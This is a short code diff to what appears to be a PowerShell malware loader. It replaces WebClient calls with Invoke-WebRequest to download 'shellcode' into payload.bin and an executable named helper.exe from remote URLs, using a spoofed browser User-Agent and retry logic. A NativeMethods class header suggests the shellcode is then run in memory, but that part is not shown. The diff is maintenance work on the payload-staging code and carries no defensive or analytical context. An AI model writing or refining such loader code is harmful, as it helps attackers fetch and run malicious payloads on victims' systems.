@@ -70,9 +70,6 @@ try {
     $shellcodePath = Join-Path $cachePath "payload.bin"
     
     Write-DebugLog "Downloading shellcode from: $shellcodeUrl"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $webClient.Timeout = 300000  # 5 minutes timeout
     
     $retryCount = 0
     $maxRetries = 5
@@ -82,7 +79,7 @@ try {
         try {
             $retryCount++
             Write-DebugLog "Download attempt $retryCount of $maxRetries"
-            $webClient.DownloadFile($shellcodeUrl, $shellcodePath)
+            Invoke-WebRequest -Uri $shellcodeUrl -OutFile $shellcodePath -TimeoutSec 300 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
             $downloadSuccess = $true
             Write-DebugLog "Shellcode download successful on attempt $retryCount"
             break
@@ -171,7 +168,7 @@ public class NativeMethods {
         $exePath = Join-Path $cachePath "helper.exe"
         
         Write-DebugLog "Downloading EXE from: $exeUrl"
-        $webClient.DownloadFile($exeUrl, $exePath)
+        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -TimeoutSec 300 -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
         
         if (Test-Path $exePath) {
             $exeSize = (Get-Item $exePath).Length
